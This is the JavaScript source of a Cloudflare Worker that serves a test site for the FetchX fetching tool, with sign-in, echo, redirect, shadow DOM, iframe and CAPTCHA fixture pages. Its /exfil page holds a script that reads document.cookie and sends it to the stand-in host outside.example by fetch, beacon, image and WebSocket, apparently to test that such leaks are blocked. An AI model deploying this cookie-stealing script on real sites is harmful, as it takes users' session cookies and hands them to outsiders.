// fixtures.fetchx.ai: FetchX's public test site, for FetchX's own checks and
// for callers' acceptance tests (PortTrack's F0). Every page is deterministic
// and served from here, with no third-party scripts except the CAPTCHA pages,
// which load their vendor's widget with the vendor's published test keys.
// frame.fixtures.fetchx.ai serves the framed form for /frame.
//
// Nothing here is site-specific to anyone else, and nothing is stored: a
// session is a signed cookie, and /echo answers with what it was sent.
//
// Test sign-in: username fixture-user, password fixture-password.

export const USERNAME = 'fixture-user';
export const PASSWORD = 'fixture-password';
const MAX_DELAY_MS = 40_000;
const MAX_ECHO_BYTES = 1_048_576;

// The vendors' published test keys: every verification passes (reCAPTCHA v2,
// hCaptcha, Turnstile). reCAPTCHA v3 and MTCaptcha publish none, so their
// pages need keys set as Worker vars or secrets (RECAPTCHA_V3_SITEKEY and
// RECAPTCHA_V3_SECRET, MTCAPTCHA_SITEKEY and MTCAPTCHA_PRIVATEKEY) and
// answer 503 without them.
export const VENDORS = Object.freeze({
  'recaptcha-v2': {
    sitekey: '6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI', secret: '6LeIxAcTAAAAAGG-vFI1TnRWxMZNFuojJ4WifJWe', field: 'g-recaptcha-response',
    verify: 'https://www.google.com/recaptcha/api/siteverify',
  },
  'recaptcha-v3': {
    sitekeyVar: 'RECAPTCHA_V3_SITEKEY', secretVar: 'RECAPTCHA_V3_SECRET', field: 'g-recaptcha-response',
    verify: 'https://www.google.com/recaptcha/api/siteverify',
  },
  hcaptcha: {
    sitekey: '10000000-ffff-ffff-ffff-000000000001', secret: '0x0000000000000000000000000000000000000000', field: 'h-captcha-response',
    verify: 'https://api.hcaptcha.com/siteverify',
  },
  turnstile: {
    sitekey: '1x00000000000000000000AA', secret: '1x0000000000000000000000000000000AA', field: 'cf-turnstile-response',
    verify: 'https://challenges.cloudflare.com/turnstile/v0/siteverify',
  },
  mtcaptcha: {
    sitekeyVar: 'MTCAPTCHA_SITEKEY', secretVar: 'MTCAPTCHA_PRIVATEKEY', field: 'mtcaptcha-verifiedtoken',
    verify: 'https://service.mtcaptcha.com/mtcv1/api/checktoken',
  },
});

const PAGES = [
  ['/login', 'A sign-in form (#username, #password, hidden _csrf, #signIn). The right sign-in answers 302 to /home with the fxs and seen cookies; a wrong one answers 200 with #error.'],
  ['/home', 'Shows #logout with a valid fxs cookie, otherwise 302 to /login.'],
  ['/echo', 'POST: answers with the request\'s method, URL, headers and body as JSON.'],
  ['/shadow?delay_ms=N', 'fx-input and fx-button with open shadow roots. A click asks /api/lookup, N ms later (at most 40000), and draws <table id="result">.'],
  ['/api/lookup?ids=V1,X2', 'JSON {validIds, invalidIds}: an id is valid when it starts with V.'],
  ['/chain', '302 to /chain/2 (sets h1=a), 302 to /chain/3 (sets h2=b), then 200 (sets h3=c).'],
  ['/ip', 'JSON {ip, user_agent, accept_language} as this site saw the request.'],
  ['/frame?captcha=turnstile', 'A cross-origin iframe from frame.fixtures.fetchx.ai holding a form and a CAPTCHA widget (turnstile, hcaptcha, recaptcha-v2 or none).'],
  ['/captcha/{vendor}', 'A sign-in form gated by the vendor\'s widget: recaptcha-v2, recaptcha-v3, hcaptcha, turnstile or mtcaptcha. #signIn stays disabled until the widget\'s callback, and the server verifies the token.'],
  ['/exfil', 'A page whose script tries to send its cookie to https://outside.example/ (fetch, sendBeacon, an image and a WebSocket).'],
];

const escape = value => String(value).replace(/[&<>"']/g, c => ({'&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', '\'': '&#39;'})[c]);
// no-transform keeps Cloudflare from changing the pages on their way out: the
// zone's Web Analytics would otherwise add its beacon script
// (static.cloudflareinsights.com), and these pages load no third-party scripts.
const BASE_HEADERS = {'cache-control': 'no-store, no-transform', 'x-robots-tag': 'noindex, nofollow', 'referrer-policy': 'no-referrer'};

function respond(body, status, type, extra = {}, cookies = []) {
  const headers = new Headers({...BASE_HEADERS, ...(type ? {'content-type': type} : {}), ...extra});
  for (const cookie of cookies) headers.append('set-cookie', cookie);
  return new Response(body, {status, headers});
}
const html = (body, status = 200, extra, cookies) => respond(body, status, 'text/html; charset=utf-8', extra, cookies);
const json = (value, status = 200) => respond(JSON.stringify(value), status, 'application/json');
const redirect = (location, cookies = []) => respond(null, 302, null, {location}, cookies);
const page = (title, body, head = '') => `<!doctype html><html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1"><title>${escape(title)}</title>${head}</head>
<body><main>${body}</main></body></html>`;

function cookiesOf(request) {
  const jar = {};
  for (const part of (request.headers.get('cookie') ?? '').split(';')) {
    const at = part.indexOf('=');
    if (at > 0) jar[part.slice(0, at).trim()] = part.slice(at + 1).trim();
  }
  return jar;
}

function base64(bytes) {
  let binary = '';
  for (let at = 0; at < bytes.length; at += 0x8000) binary += String.fromCharCode(...bytes.subarray(at, at + 0x8000));
  return btoa(binary);
}
const bytesToBase64url = bytes => base64(bytes).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
// Cookie flags: Secure, except on a local copy served over plain HTTP (LOCAL_HTTP).
const flags = env => (env.LOCAL_HTTP ? 'SameSite=Lax' : 'Secure; SameSite=Lax');
const randomToken = () => bytesToBase64url(crypto.getRandomValues(new Uint8Array(18)));
// Sessions are signed, not stored. The key is no secret worth keeping (this is
// a test site); FIXTURE_KEY replaces it.
async function sign(env, value) {
  const key = await crypto.subtle.importKey('raw', new TextEncoder().encode(env.FIXTURE_KEY ?? 'fixtures.fetchx.ai'),
    {name: 'HMAC', hash: 'SHA-256'}, false, ['sign']);
  return bytesToBase64url(new Uint8Array(await crypto.subtle.sign('HMAC', key, new TextEncoder().encode(value)))).slice(0, 22);
}
async function newSession(env) {
  const id = randomToken();
  return `${id}.${await sign(env, id)}`;
}
async function validSession(env, value) {
  const [id, signature] = (value ?? '').split('.');
  return !!id && !!signature && signature === await sign(env, id);
}
const signedIn = async env => [`fxs=${await newSession(env)}; HttpOnly; Path=/; ${flags(env)}`, `seen=1; Path=/; ${flags(env)}`];

async function formOf(request) {
  const type = request.headers.get('content-type') ?? '';
  if (type.includes('application/json')) {
    const value = await request.json().catch(() => null);
    return value && typeof value === 'object' ? value : {};
  }
  if (type.includes('application/x-www-form-urlencoded') || type.includes('multipart/form-data')) {
    const data = await request.formData().catch(() => null);
    return data ? Object.fromEntries([...data.entries()].filter(([, v]) => typeof v === 'string')) : {};
  }
  return {};
}

// ------------------------------------------------------------------ sign-in

const loginForm = (csrf, error = '') => page('Sign in', `<h1>Sign in</h1>
${error ? `<p id="error" role="alert">${escape(error)}</p>` : ''}
<form id="login" method="post" action="/login">
<input type="hidden" name="_csrf" value="${escape(csrf)}">
<label>Username <input id="username" name="username" autocomplete="username"></label>
<label>Password <input id="password" name="password" type="password" autocomplete="current-password"></label>
<button id="signIn" type="submit">Sign in</button>
</form>`);

async function login(request, env) {
  if (request.method === 'GET' || request.method === 'HEAD') {
    const csrf = randomToken();
    return html(loginForm(csrf), 200, {}, [`fxcsrf=${csrf}; HttpOnly; Path=/login; ${flags(env)}`]);
  }
  if (request.method !== 'POST') return respond('', 405, 'text/plain', {allow: 'GET, POST'});
  const form = await formOf(request);
  const csrf = cookiesOf(request).fxcsrf;
  const fresh = randomToken();
  const again = [`fxcsrf=${fresh}; HttpOnly; Path=/login; ${flags(env)}`];
  if (!csrf || form._csrf !== csrf) return html(loginForm(fresh, 'The form expired. Sign in again.'), 403, {}, again);
  if (form.username !== USERNAME || form.password !== PASSWORD) return html(loginForm(fresh, 'Wrong username or password.'), 200, {}, again);
  return redirect('/home', await signedIn(env));
}

async function home(request, env) {
  if (!(await validSession(env, cookiesOf(request).fxs))) return redirect('/login');
  return html(page('Home', `<h1>Signed in</h1><p id="account">${USERNAME}</p><a id="logout" href="/logout">Sign out</a>`));
}

// ------------------------------------------------------------------ echo, ip, chain

async function echo(request) {
  if (request.method !== 'POST') return respond('', 405, 'text/plain', {allow: 'POST'});
  const body = new Uint8Array(await request.arrayBuffer());
  if (body.length > MAX_ECHO_BYTES) return json({error: 'body over 1 MB'}, 413);
  let text = null;
  try { text = new TextDecoder('utf-8', {fatal: true}).decode(body); } catch { /* binary */ }
  return json({method: request.method, url: request.url, headers: [...request.headers],
    body: text ?? base64(body), body_encoding: text === null ? 'base64' : 'utf8', body_bytes: body.length});
}

const ipOf = (request, env) => request.headers.get('cf-connecting-ip')
  ?? (env.TRUST_FORWARDED ? request.headers.get('x-forwarded-for')?.split(',')[0].trim() : null) ?? env.REMOTE_ADDRESS ?? null;

function chain(path) {
  if (path === '/chain') return redirect('/chain/2', ['h1=a; Path=/']);
  if (path === '/chain/2') return redirect('/chain/3', ['h2=b; Path=/']);
  return html(page('Chain', '<h1 id="end">End of the chain</h1>'), 200, {}, ['h3=c; Path=/']);
}

// ------------------------------------------------------------------ shadow DOM lookup

const shadow = delay => page('Lookup', `<h1>Look up ids</h1>
<fx-input></fx-input> <fx-button></fx-button>
<div id="out"></div>
<script>
customElements.define('fx-input', class extends HTMLElement {
  constructor() { super(); this.attachShadow({mode: 'open'}).innerHTML = '<input type="text" aria-label="ids" placeholder="V1,X2">'; }
});
customElements.define('fx-button', class extends HTMLElement {
  constructor() {
    super();
    this.attachShadow({mode: 'open'}).innerHTML = '<button type="button">Look up</button>';
    this.shadowRoot.querySelector('button').addEventListener('click', () => setTimeout(async () => {
      const ids = document.querySelector('fx-input').shadowRoot.querySelector('input').value;
      const answer = await (await fetch('/api/lookup?ids=' + encodeURIComponent(ids))).json();
      const cell = text => '<td>' + String(text).replace(/[&<>"']/g, '') + '</td>';
      document.getElementById('out').innerHTML = '<table id="result">'
        + answer.validIds.map(id => '<tr class="valid">' + cell(id) + '<td>valid</td></tr>').join('')
        + answer.invalidIds.map(id => '<tr class="invalid">' + cell(id) + '<td>invalid</td></tr>').join('') + '</table>';
    }, ${delay}));
  }
});
</script>`);

function lookup(url) {
  const ids = (url.searchParams.get('ids') ?? '').split(',').map(id => id.trim()).filter(Boolean).slice(0, 100);
  return json({validIds: ids.filter(id => id.startsWith('V')), invalidIds: ids.filter(id => !id.startsWith('V'))});
}

// ------------------------------------------------------------------ CAPTCHAs

function keysOf(name, env) {
  const vendor = VENDORS[name];
  if (!vendor) return null;
  const sitekey = vendor.sitekey ?? env[vendor.sitekeyVar];
  const secret = vendor.secret ?? env[vendor.secretVar];
  return sitekey && secret ? {...vendor, name, sitekey, secret} : {...vendor, name, missing: true};
}

// The widget and the script that loads it. Every widget calls fxSolved when
// it is solved, which enables #signIn.
function widget(vendor) {
  const key = escape(vendor.sitekey);
  switch (vendor.name) {
    case 'recaptcha-v2': return {head: '<script src="https://www.google.com/recaptcha/api.js" async defer></script>',
      body: `<div class="g-recaptcha" data-sitekey="${key}" data-callback="fxSolved" data-expired-callback="fxExpired"></div>`};
    case 'hcaptcha': return {head: '<script src="https://js.hcaptcha.com/1/api.js" async defer></script>',
      body: `<div class="h-captcha" data-sitekey="${key}" data-callback="fxSolved" data-expired-callback="fxExpired"></div>`};
    case 'turnstile': return {head: '<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>',
      body: `<div class="cf-turnstile" data-sitekey="${key}" data-callback="fxSolved" data-expired-callback="fxExpired"></div>`};
    case 'recaptcha-v3': return {head: `<script src="https://www.google.com/recaptcha/api.js?render=${key}"></script>`,
      body: `<input type="hidden" name="g-recaptcha-response" id="g-recaptcha-response">
<script>grecaptcha.ready(() => grecaptcha.execute(${JSON.stringify(vendor.sitekey)}, {action: 'login'}).then(token => {
  document.getElementById('g-recaptcha-response').value = token; fxSolved(token); }));</script>`};
    case 'mtcaptcha': return {head: `<script>var mtcaptchaConfig = {sitekey: ${JSON.stringify(vendor.sitekey)}, 'verified-callback': 'fxSolved', 'verifyexpired-callback': 'fxExpired'};
(function () { for (const src of ['https://service.mtcaptcha.com/mtcv1/client/mtcaptcha.min.js', 'https://service2.mtcaptcha.com/mtcv1/client/mtcaptcha2.min.js']) {
  const script = document.createElement('script'); script.async = true; script.src = src; document.head.appendChild(script); } })();</script>`,
      body: '<div class="mtcaptcha"></div>'};
    default: return {head: '', body: ''};
  }
}

const GATE_SCRIPT = `<script>
function fxSolved() { for (const button of document.querySelectorAll('[data-gated]')) button.disabled = false; }
function fxExpired() { for (const button of document.querySelectorAll('[data-gated]')) button.disabled = true; }
</script>`;

const captchaForm = (vendor, action, error = '') => {
  const {head, body} = widget(vendor);
  return page(`Sign in (${vendor.name})`, `<h1>Sign in</h1>
${error ? `<p id="error" role="alert">${escape(error)}</p>` : ''}
<form id="login" method="post" action="${escape(action)}">
<label>Username <input id="username" name="username" autocomplete="username"></label>
<label>Password <input id="password" name="password" type="password" autocomplete="current-password"></label>
${body}
<button id="signIn" type="submit" data-gated disabled>Sign in</button>
</form>`, GATE_SCRIPT + head);
};

// What the vendor says about a token, with the request's own address.
export async function verifyToken(vendor, token, remoteip) {
  if (!token) return false;
  try {
    let answer;
    if (vendor.name === 'mtcaptcha') {
      const url = new URL(vendor.verify);
      url.searchParams.set('privatekey', vendor.secret);
      url.searchParams.set('token', token);
      answer = await fetch(url, {signal: AbortSignal.timeout(10_000)});
    } else {
      const form = new URLSearchParams({secret: vendor.secret, response: token});
      if (remoteip) form.set('remoteip', remoteip);
      if (vendor.name === 'hcaptcha') form.set('sitekey', vendor.sitekey);
      answer = await fetch(vendor.verify, {method: 'POST', body: form, signal: AbortSignal.timeout(10_000)});
    }
    const result = await answer.json();
    return result?.success === true;
  } catch {
    return false;
  }
}

async function captcha(request, env, name) {
  const vendor = keysOf(name, env);
  if (!vendor) return html(page('Not found', '<h1>No such CAPTCHA</h1>'), 404);
  if (vendor.missing) {
    return html(page('Not configured', `<p id="error">The ${escape(name)} page needs its keys (${escape(vendor.sitekeyVar)} and ${escape(vendor.secretVar)}).</p>`), 503);
  }
  const action = `/captcha/${name}`;
  if (request.method === 'GET' || request.method === 'HEAD') return html(captchaForm(vendor, action));
  if (request.method !== 'POST') return respond('', 405, 'text/plain', {allow: 'GET, POST'});
  const form = await formOf(request);
  if (!(await verifyToken(vendor, form[vendor.field], ipOf(request, env)))) {
    return html(captchaForm(vendor, action, 'The CAPTCHA was not solved.'), 200);
  }
  if (form.username !== USERNAME || form.password !== PASSWORD) return html(captchaForm(vendor, action, 'Wrong username or password.'), 200);
  return redirect('/home', await signedIn(env));
}

// ------------------------------------------------------------------ frames

const FRAME_VENDORS = new Set(['turnstile', 'hcaptcha', 'recaptcha-v2']);
const frameVendor = url => {
  const name = url.searchParams.get('captcha') ?? 'turnstile';
  return name === 'none' || FRAME_VENDORS.has(name) ? name : 'turnstile';
};
// The frame's origin: frame.<this host>, or FRAME_ORIGIN when set (a local copy).
const frameOrigin = (url, env) => env.FRAME_ORIGIN ?? `${url.protocol}//frame.${url.host}`;
const isFrameHost = (url, env) => url.hostname.startsWith('frame.') || (env.FRAME_ORIGIN && new URL(env.FRAME_ORIGIN).host === url.host);

function framePage(url, env) {
  const vendor = frameVendor(url);
  const src = `${frameOrigin(url, env)}/form?captcha=${encodeURIComponent(vendor)}`;
  return html(page('Framed form', `<h1>A form in a frame</h1>
<iframe id="frame" title="form" src="${escape(src)}" width="480" height="420"></iframe>`));
}

async function frameForm(request, env, url) {
  const name = frameVendor(url);
  const vendor = name === 'none' ? null : keysOf(name, env);
  const action = `/form?captcha=${encodeURIComponent(name)}`;
  const form = error => {
    const {head, body} = vendor ? widget(vendor) : {head: '', body: ''};
    return page('Form', `${error ? `<p id="error" role="alert">${escape(error)}</p>` : ''}
<form id="contact" method="post" action="${escape(action)}">
<label>Name <input id="name" name="name"></label>
<label>Email <input id="email" name="email" type="email"></label>
${body}
<button id="send" type="submit" ${vendor ? 'data-gated disabled' : ''}>Send</button>
</form>`, GATE_SCRIPT + head);
  };
  if (request.method === 'GET' || request.method === 'HEAD') return html(form());
  if (request.method !== 'POST') return respond('', 405, 'text/plain', {allow: 'GET, POST'});
  const fields = await formOf(request);
  if (vendor && !(await verifyToken(vendor, fields[vendor.field], ipOf(request, env)))) return html(form('The CAPTCHA was not solved.'));
  if (!fields.name) return html(form('Name is required.'));
  return html(page('Sent', `<p id="done">Thanks, ${escape(fields.name)}.</p>`));
}

// ------------------------------------------------------------------ exfiltration attempts (G3)

const exfil = env => html(page('Exfil', `<h1>This page tries to send data elsewhere</h1>
<ul id="exfil"></ul>
<script>
const note = (how, result) => { const item = document.createElement('li'); item.dataset.how = how; item.textContent = how + ': ' + result;
  document.getElementById('exfil').appendChild(item); };
const payload = encodeURIComponent(document.cookie || 'none');
fetch('https://outside.example/collect?c=' + payload, {method: 'POST', body: payload, mode: 'no-cors'})
  .then(() => note('fetch', 'sent'), () => note('fetch', 'failed'));
try { note('beacon', navigator.sendBeacon('https://outside.example/beacon', payload) ? 'queued' : 'refused'); } catch { note('beacon', 'failed'); }
const image = new Image(); image.onload = () => note('image', 'loaded'); image.onerror = () => note('image', 'failed');
image.src = 'https://outside.example/pixel.gif?c=' + payload;
try { const socket = new WebSocket('wss://outside.example/socket'); socket.onopen = () => note('websocket', 'open');
  socket.onerror = () => note('websocket', 'failed'); } catch { note('websocket', 'failed'); }
</script>`), 200, {}, [`secret=fixture-cookie; Path=/; ${flags(env)}`]);

// ------------------------------------------------------------------ index

const index = () => html(page('FetchX fixtures', `<h1>FetchX fixtures</h1>
<p>A test site for <a href="https://fetchx.ai/docs">FetchX</a>. Every page is served from here and behaves the same every time.
The sign-in is <code>${USERNAME}</code> / <code>${PASSWORD}</code>.</p>
<table id="pages"><tr><th>Path</th><th>What it does</th></tr>
${PAGES.map(([path, what]) => `<tr><td><code>${escape(path)}</code></td><td>${escape(what)}</td></tr>`).join('\n')}
</table>`));

export default {
  async fetch(request, env = {}) {
    const url = new URL(request.url);
    const path = url.pathname.replace(/\/+$/, '') || '/';
    const head = request.method === 'HEAD';
    const answer = await route(request, env, url, path);
    return head ? new Response(null, {status: answer.status, headers: answer.headers}) : answer;
  },
};

async function route(request, env, url, path) {
  if (path === '/robots.txt') return respond('User-agent: *\nDisallow: /\n', 200, 'text/plain');
  if (isFrameHost(url, env)) {
    if (path === '/form') return frameForm(request, env, url);
    return html(page('Not found', '<h1>Not found</h1>'), 404);
  }
  const reads = request.method === 'GET' || request.method === 'HEAD';
  switch (path) {
    case '/': return index();
    case '/login': return login(request, env);
    case '/home': return home(request, env);
    case '/logout': return redirect('/login', [`fxs=; Path=/; Max-Age=0; ${flags(env)}`]);
    case '/echo': return echo(request);
    case '/ip': return json({ip: ipOf(request, env), user_agent: request.headers.get('user-agent'),
      accept_language: request.headers.get('accept-language')});
    case '/chain': case '/chain/2': case '/chain/3': return chain(path);
    case '/shadow': {
      const delay = Math.min(MAX_DELAY_MS, Math.max(0, Number.parseInt(url.searchParams.get('delay_ms') ?? '0', 10) || 0));
      return html(shadow(delay));
    }
    case '/api/lookup': return lookup(url);
    case '/frame': return framePage(url, env);
    case '/exfil': return exfil(env);
    default:
      if (path.startsWith('/captcha/')) return captcha(request, env, path.slice('/captcha/'.length));
      return html(page('Not found', '<h1>Not found</h1>'), reads ? 404 : 405);
  }
}
